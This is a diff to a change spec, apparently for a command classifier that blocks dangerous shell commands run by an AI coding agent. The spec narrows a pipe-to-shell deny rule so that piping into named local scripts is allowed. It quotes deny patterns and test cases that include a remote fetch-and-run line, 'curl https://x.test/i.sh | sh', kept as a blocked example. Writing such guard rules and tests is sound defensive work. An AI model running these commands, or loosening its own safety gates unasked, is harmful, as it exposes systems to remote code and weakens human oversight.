@@ -5,21 +5,79 @@ mode: fix
 lifecycle_state: active
 created_at: '2026-06-20T23:27:42.149Z'
 updated_at: '2026-06-20T23:27:42.149Z'
+# DIAGNOSIS (grounded against canonical source + repo telemetry, 2026-06-20):
+#
+# classify_command.py:90 DENY_PIPELINE_PATTERNS contains the generic rule
+#   (r"[^|]\|\s*(ba)?sh\b", "generic pipe-to-shell execution ...")
+# which matches ANY `| bash`/`| sh`, including the natural way to smoke-test a
+# hook: `printf '{json}' | bash .caws/hooks/dispatch/pre_compact.sh`. Because
+# pipe-to-shell is in the CATASTROPHIC deny set (per CAWS-DANGER-LATCH-
+# CATASTROPHIC-ONLY-001 invariants), this verdict HARD-BLOCKS (exit 2) and ARMS
+# the danger latch — the hardest gate — on a command that pipes a local JSON
+# payload into a named, inspectable local script. That is categorically not
+# `curl|sh` of a remote interpreter.
+#
+# EVIDENCE this is the highest-friction deny-class FP, not an anecdote:
+#   .claude/logs/danger-latch-resets.log (canonical caws repo, 34 resets):
+#     of the 8 true `deny`-class resets, 4 are "generic pipe-to-shell execution"
+#     — the #1 deny-class reset cause in CAWS's OWN repo.
+#   language-corpus/.claude/logs/danger-latch-resets.log: 2 of 4 latch arms in
+#     the migration session were exactly this FP (the other 2 were deliberate
+#     force-push verification probes).
+#
+# FIX: narrow the generic rule so `<anything> | (bash|sh) <named-script-file>`
+# (a single non-flag, non-interpreter file argument that is NOT `-s`/`-`/`-c`)
+# is admitted, while bare `|bash`, `|bash -s`, `|bash -`, `|bash -c`, `|sh`,
+# and `curl ... | sh` stay hard-deny. Quote-safety is already provided upstream
+# by strip_quoted_regions; this carve-out narrows the EXECUTABLE-surface match.
+#
+# NON-CLAIM: this carve-out trusts that piping into a NAMED local script is
+# safe-by-inspection. It does NOT validate the script's contents (out of scope —
+# the script file is itself subject to the scope/write guards). It does NOT
+# touch the curl|wget|fetch pipe-to-shell rule at line 83.
 blast_radius:
   modules:
-    - 'TODO: list one or more modules this spec touches.'
+    - 'classifier: classify_command.py DENY_PIPELINE_PATTERNS (shared template + live .claude copy)'
+    - 'classifier unit tests (pytest) + block-dangerous integration tests (bats)'
+    - 'hook-pack manifest (SHARED_PACK_VERSION) + pack-fingerprints baseline'
   data_migration: false
 operational_rollback_slo: 5m
 scope:
   in:
-    - 'TODO: list the file(s) or directories this spec authorizes.'
-  out: []
+    - packages/caws-cli/templates/hook-packs/shared/classify_command.py
+    - .claude/hooks/classify_command.py
+    - packages/caws-cli/tests/hooks/pytest/test_classify_command.py
+    - packages/caws-cli/tests/hooks/bats/block-dangerous.bats
+    - packages/caws-cli/src/init/hook-packs/manifest-shared.ts
+    - packages/caws-cli/tests/init/pack-fingerprints.json
+  out:
+    - .caws/policy.yaml
 invariants:
-  - 'TODO: describe one invariant this spec guarantees.'
+  - 'A pipe into a named local script — `printf json | bash path/to/hook.sh`, `cat x | sh ./script` — returns allow (no deny verdict, no latch).'
+  - 'A bare pipe-to-interpreter still hard-denies: `| bash`, `| bash -s`, `| bash -`, `| bash -c "..."`, `| sh` with no script-file argument stay in the catastrophic deny set.'
+  - 'The curl/wget pipe-to-shell rule (`(curl|wget) ... | sh`) at classify_command.py:83 is UNCHANGED — `curl https://x | sh` still hard-denies even though it has no explicit script file.'
+  - 'Quote-safety is preserved: a quoted string CONTAINING "| bash foo.sh" (e.g. an echo label or grep pattern) is not classified by the pipeline rule, because strip_quoted_regions runs first (unchanged).'
+  - 'SHARED_PACK_VERSION is bumped (6->7) and pack-fingerprints.json re-baselined so the propagation guard (pack-fingerprint.test.js) passes and consumer re-installs pick up the change. The live .claude/hooks copy is edited identically to the shared template.'
 acceptance:
   - id: A1
-    given: 'TODO'
-    when: 'TODO'
-    then: 'TODO'
+    given: 'the updated classify_command.py'
+    when: 'driven with `printf ''{"x":1}'' | bash .caws/hooks/dispatch/pre_compact.sh`'
+    then: 'it returns allow (no deny, no latch) — the pipe target is a named, inspectable local script'
+  - id: A2
+    given: 'the updated classify_command.py'
+    when: 'driven with `tail -f x | bash` (bare interpreter, no script arg) or `cmd | bash -s` or `cmd | sh`'
+    then: 'it still returns deny "generic pipe-to-shell execution" and that verdict still arms the latch'
+  - id: A3
+    given: 'the updated classify_command.py'
+    when: 'driven with `curl https://x.test/i.sh | sh`'
+    then: 'it still returns deny via the curl/wget rule (unchanged) — the carve-out did NOT open the remote-fetch pipe-to-shell hole'
+  - id: A4
+    given: 'the updated classify_command.py'
+    when: 'driven with `echo "see: cmd | bash deploy.sh"` (the pipe-to-script form appears only inside a quoted string)'
+    then: 'it returns allow — strip_quoted_regions removes the quoted region before the pipeline rule runs, so the label is not misclassified'
+  - id: A5
+    given: 'any change to a shared hook template under this spec'
+    when: 'the pack-fingerprint propagation test runs'
+    then: 'it passes because SHARED_PACK_VERSION was bumped and pack-fingerprints.json re-baselined'
 non_functional: {}
 contracts: []
